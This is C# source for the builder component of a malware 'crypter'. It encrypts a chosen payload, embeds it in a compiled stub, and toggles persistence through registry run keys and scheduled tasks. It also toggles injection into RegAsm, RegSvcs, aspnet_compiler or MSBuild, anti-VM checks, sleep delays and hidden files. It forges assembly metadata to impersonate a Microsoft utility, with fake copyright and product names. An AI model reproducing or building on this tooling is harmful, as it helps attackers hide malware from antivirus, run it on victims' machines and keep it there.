using Crypter.Core;
using Crypter.Obfuscator;
using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace Crypter.Builder
{
    class Builder
    {
        private Settings _settings;
        string destinationIconPath = Environment.CurrentDirectory + "\\icon.ico";
        public Builder(Settings settings)
        {
            _settings = settings;
        }
        public bool Build()
        {
            _settings.decryptKey = Randomize.RandomString(25);
            _settings.resourceName = Randomize.RandomString(25);

            byte[] payload = File.ReadAllBytes(_settings.payloadName);

            string updatedStub = Replace(Properties.Resources.Stub);
            byte[] enc = Encryption.Encrypt(payload, _settings.encryptionType, _settings.decryptKey);
            _settings.encryptedPayload = Convert.ToBase64String(enc);

            using (FileStream fileStream = File.Create(_settings.resourceName))
            {
                fileStream.Write(enc, 0, enc.Length);
            }

            CompilerParameters compParams = this.GenerateCompilerParams();
            compParams.EmbeddedResources.Add(this._settings.resourceName);

            CompilerResults Results = new CSharpCodeProvider().CompileAssemblyFromSource(compParams, updatedStub);

            
            File.Delete(this._settings.resourceName);

            if (Results.Errors.Count > 0)
            {
                using (StreamWriter writer = new StreamWriter("error.log"))
                {
                    writer.WriteLine("Found errors while encrypting:");

                    foreach (CompilerError ce in Results.Errors)
                    {
                        writer.WriteLine(ce.ToString());
                        writer.WriteLine();
                    }
                }

                MessageBox.Show("Found errors while encrypting. See error.log for details.");
                Environment.Exit(1);
            }
            else
            {
                MessageBox.Show("Successfully encrypted file!");
            }

            return true;
        }

        private CompilerParameters GenerateCompilerParams()
        {
            string compilerOptions = "";

            if (!string.IsNullOrWhiteSpace(_settings.AssemblyIcon))
            {
                File.Copy(_settings.AssemblyIcon, destinationIconPath, true);
                compilerOptions += $" /win32icon:\"{destinationIconPath}\"";
            }

            return new CompilerParameters
            {
                GenerateExecutable = true,
                TreatWarningsAsErrors = false,
                OutputAssembly = _settings.buildDirectory,
                CompilerOptions = "/optimize- /platform:x86 /unsafe /target:winexe" +compilerOptions,
                ReferencedAssemblies =
                {
                    "System.dll",
                    "System.Windows.Forms.dll",
                    "System.Linq.dll"
                }
            };
        }

        private string Replace(string stub)
        {
            // General
            stub = stub.Replace("[KEY]", _settings.decryptKey);
            stub = stub.Replace("[INJECTION]", _settings.injectionType);
            stub = stub.Replace("[PAYLOAD]", _settings.payloadName);
            stub = stub.Replace("[RES]", _settings.resourceName);
            

            // Startup
            if (_settings.doInstall == true)
                stub = stub.Replace("//#define INSTALL", "#define INSTALL");

            if (_settings.doRegedit == true)
                stub = stub.Replace("//#define REGEDIT", "#define REGEDIT");

            if (_settings.doSchtasks == true)
                stub = stub.Replace("//#define SCHTASKS", "#define SCHTASKS");


            stub = stub.Replace("[FILENAME]", _settings.fileName + ".exe");
            stub = stub.Replace("[SPECIAL]", _settings.specialDir);
            stub = stub.Replace("[FOLDERNAME]", @"" + _settings.folderName + @"");
            stub = stub.Replace("[REGEDIT]", _settings.regeditName);
            stub = stub.Replace("[SCHTASKS]", _settings.schtasksName);

            // Assembly cloner
            stub = stub.Replace("#AssemblyTitle", _settings.AssemblyProduct ?? "Microsoft .NET Assembly Registration Utility");
            stub = stub.Replace("#AssemblyDescription", _settings.AssemblyDescription ??"");
            stub = stub.Replace("#AssemblyProduct", _settings.AssemblyProduct ?? "Microsoft .NET Assembly Registration Utility");
            stub = stub.Replace("#AssemblyCompany", _settings.AssemblyCompany ?? "Microsoft .NET Assembly Registration Utility");
            stub = stub.Replace("#AssemblyCopyright", _settings.AssemblyCopyright ?? "© Microsoft Corporation. All rights reserved"); // None
            stub = stub.Replace("#AssemblyTrademark", _settings.AssemblyTrademark ?? "");
            stub = stub.Replace("#AssemblyMajorVersion", _settings.AssemblyMajorVersion ?? "7");
            stub = stub.Replace("#AssemblyMinorVersion", _settings.AssemblyMinorVersion ?? "8");
            stub = stub.Replace("#AssemblyBuildPart", _settings.AssemblyBuildPart ?? "609");
            stub = stub.Replace("#AssemblyMajorVersion", _settings.AssemblyMajorVersion ?? "0");
            stub = stub.Replace("#AssemblyPrivatePart", _settings.AssemblyPrivatePart ?? "0");
            stub = stub.Replace("#Guid", Guid.NewGuid().ToString());


            // Encryption
            EncryptionType encryptionType = _settings.encryptionType;

            if (encryptionType == EncryptionType.AES)
            {
                stub = stub.Replace("//#define AES", "#define AES");
            }
            else
            {
                stub = stub.Replace("//#define XOR", "#define XOR");
            }

            // Injection
            if(_settings.injectionName == "Itself")
            {
                stub = stub.Replace("//#define ITSELF", "#define ITSELF");
            }
            else if(_settings.injectionName == "RegAsm")
            {
                stub = stub.Replace("//#define REGASM", "#define REGASM");
            }
            else if(_settings.injectionName == "RegSvcs")
            {
                stub = stub.Replace("//#define REGSVCS", "#define REGSVCS");
            }
            else if(_settings.injectionName == "aspnet_compiler")
            {
                stub = stub.Replace("//#define ASPNET", "#define ASPNET");
            }
            else
            {
                stub = stub.Replace("//#define MSBUILD", "#define MSBUILD");
            }

            // Settings
            if(_settings.doSleep == true)
            {
                stub = stub.Replace("[SLEEP]", _settings.sleep.ToString());
                stub = stub.Replace("//#define SLEEP", "#define SLEEP");
            }
            if (_settings.doAntiVM == true)
            {
                stub = stub.Replace("//#define ANTIVM", "#define ANTIVM");
            }

            if (_settings.HIDDENFILE == true)
                stub = stub.Replace("//#define HIDDEN", "#define HIDDEN");

            return stub;
        }
    }
}
